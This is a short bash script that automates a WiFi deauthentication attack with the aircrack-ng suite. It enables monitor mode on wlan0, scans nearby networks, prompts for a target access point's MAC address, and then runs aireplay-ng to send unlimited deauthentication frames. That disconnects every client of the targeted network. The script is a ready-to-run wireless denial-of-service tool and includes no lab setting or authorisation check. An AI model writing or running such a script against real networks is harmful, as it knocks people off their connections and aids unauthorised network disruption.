#!/bin/bash

# Function to check network interfaces
check_network_interfaces() {
    ifconfig
}

# Function to start monitor mode
start_monitor_mode() {
    interface="wlan0"
    sudo airmon-ng start $interface
}

# Function to capture WiFi information
capture_wifi_info() {
    interface="wlan0mon"
    sudo airodump-ng $interface
}

# Function to deauthenticate access point
deauthenticate_access_point() {
    interface="wlan0mon"
    access_point_mac=$1
    sudo aireplay-ng -0 0 -a $access_point_mac $interface
}

# Main function
main() {
    # Check available network interfaces
    echo "Available network interfaces:"
    check_network_interfaces

    # Start monitor mode
    echo -e "\nStarting monitor mode..."
    start_monitor_mode

    # Capture WiFi information
    echo -e "\nCapturing WiFi information..."
    capture_wifi_info

    # Ask user for MAC address
    echo -e "\nEnter the MAC address of the access point you want to deauthenticate: "
    read access_point_mac

    # Perform deauthentication attack
    echo -e "\nPerforming deauthentication attack on access point with MAC address: $access_point_mac..."
    deauthenticate_access_point $access_point_mac
}

# Call main function
main
